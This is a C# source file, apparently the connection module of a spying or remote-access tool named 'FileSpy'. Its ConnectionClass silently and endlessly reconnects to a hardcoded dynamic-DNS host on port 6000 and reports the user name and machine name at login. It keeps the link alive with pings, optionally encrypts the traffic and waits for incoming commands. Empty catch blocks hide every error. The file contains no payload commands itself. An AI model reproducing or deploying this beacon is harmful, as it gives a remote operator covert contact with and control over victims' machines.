using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace FileSpy.Classes
{
    public class ConnectionClass
    {
        public bool Connected { get; set; }
        public bool Secured { get; set; }
        public int ID { get; set; }

        public SecuredClass Secure;

        Socket Client;
        SettingsClass Settings;

        DateTime LastTime;

        public delegate void MessageHandler(MessageClass message);
        public event MessageHandler AcceptMessage;

        public ConnectionClass(SettingsClass settings)
        {
            Secure = new SecuredClass();
            Settings = settings;
            Connected = false;
        }

        public void Start()
        {
            Task.Run(Connecter);
        }

        public void Connecter()
        {
            while (true)
            {
                if (Connected)
                {
                    Thread.Sleep(1);
                }
                else
                {
                    try
                    {
                        Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        Client.Connect("restored.ddns.net", 6000);
                        Connected = true;
                        LastTime = DateTime.Now;
                        Task.Run(Pulsar);
                        Task.Run(Listener);

                        SendMessage(new MessageClass(ID, -1, Commands.Login, 0, Settings.UserName + ";" + Environment.MachineName));
                    }
                    catch { }
                }
            }
        }

        private void Pulsar()
        {
            while (Connected)
            {
                if ((DateTime.Now - LastTime).TotalSeconds > 5)
                {
                    SendMessage(new MessageClass(ID, -1, Commands.Ping, 0));
                }
                Thread.Sleep(1);
            }
        }

        private void Listener()
        {
            while (Connected)
            {
                try
                {
                    if (Client.Available > 0)
                    {
                        AcceptMessage(ReciveMessage());
                        LastTime = DateTime.Now;
                    }
                    else
                    {
                        Thread.Sleep(1);
                    }
                }
                catch 
                {
                    Disconnect();
                }
            }
        }

        public void SendMessage(MessageClass message)
        {
            Send(Secure.Encrypt(message.GetBytes(), Secured));
        }

        public void Send(byte[] buffer)
        {
            try
            {
                Client.Send(buffer);
                LastTime = DateTime.Now;
            }
            catch
            {
                Disconnect();
            }
        }

        public MessageClass ReciveMessage()
        {
            int count = BitConverter.ToInt32(Recive(4), 0);
            if (Secured)
                return new MessageClass(Secure.Decrypt(Recive(count)));
            else
                return new MessageClass(Recive(count));
        }

        public byte[] Recive(int count)
        {
            try
            {
                if (count > 65536)
                {
                    using (var ms = new MemoryStream())
                    {
                        byte[] fullPacket = new byte[65536];
                        byte[] partPacket = new byte[count % 65536];
                        int read = 0;
                        while (count != read)
                        {
                            if (count - read > 65536)
                            {
                                while (Client.Available < fullPacket.Length)
                                    Thread.Sleep(1);
                                Client.Receive(fullPacket);
                                ms.Write(fullPacket, 0, fullPacket.Length);
                                read += fullPacket.Length;
                            }
                            else
                            {
                                while (Client.Available < partPacket.Length)
                                    Thread.Sleep(1);
                                Client.Receive(partPacket);
                                ms.Write(partPacket, 0, partPacket.Length);
                                read += partPacket.Length;
                            }
                        }
                        return ms.ToArray();
                    }
                }
                else
                {
                    while (Client.Available < count)
                        Thread.Sleep(1);
                    byte[] bufferMessage = new byte[count];
                    Client.Receive(bufferMessage);
                    return bufferMessage;
                }
            }
            catch
            {
                Disconnect();
                return BitConverter.GetBytes(0);
            }
        }

        public void Disconnect()
        {
            if (Connected)
            {
                Secured = false;
                Connected = false;
                if (Client != null)
                    Client.Dispose();
                AcceptMessage(new MessageClass(-1, ID, Commands.Disconnect, 0));
            }
        }
    }
}
